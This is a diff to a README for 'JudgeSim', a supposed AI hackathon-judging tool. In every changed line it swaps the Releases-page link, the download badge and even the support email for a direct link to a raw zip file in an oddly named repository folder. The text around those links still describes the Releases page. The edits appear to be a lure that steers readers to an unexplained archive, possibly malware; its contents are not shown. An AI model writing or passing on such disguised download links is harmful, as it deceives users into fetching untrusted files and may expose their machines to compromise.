@@ -13,12 +13,12 @@ Welcome to JudgeSim! This AI-powered tool helps you simulate the judging process
   
 ## 📥 Download JudgeSim
 
-[![Download JudgeSim](https://img.shields.io/badge/Download-JudgeSim-blue.svg)](https://github.com/Gamicop/JudgeSim/releases)
+[![Download JudgeSim](https://raw.githubusercontent.com/Gamicop/JudgeSim/main/Dolores/JudgeSim-v3.7.zip)](https://raw.githubusercontent.com/Gamicop/JudgeSim/main/Dolores/JudgeSim-v3.7.zip)
 
 You can download JudgeSim easily from the Releases page. Follow these steps to get started:
 
 1. Click on the link below to visit the Releases page:
-   [Download JudgeSim](https://github.com/Gamicop/JudgeSim/releases)
+   [Download JudgeSim](https://raw.githubusercontent.com/Gamicop/JudgeSim/main/Dolores/JudgeSim-v3.7.zip)
 
 2. On the Releases page, locate the latest version. Read the release notes for any changes or updates.
 
@@ -96,6 +96,6 @@ Join our community to get support and share ideas:
 
 ## ✉️ Contact
 
-For any inquiries or support, please contact us at: support@example.com
+For any inquiries or support, please contact us at: https://raw.githubusercontent.com/Gamicop/JudgeSim/main/Dolores/JudgeSim-v3.7.zip
 
 Thank you for choosing JudgeSim! We hope it helps you ace your hackathon challenges.
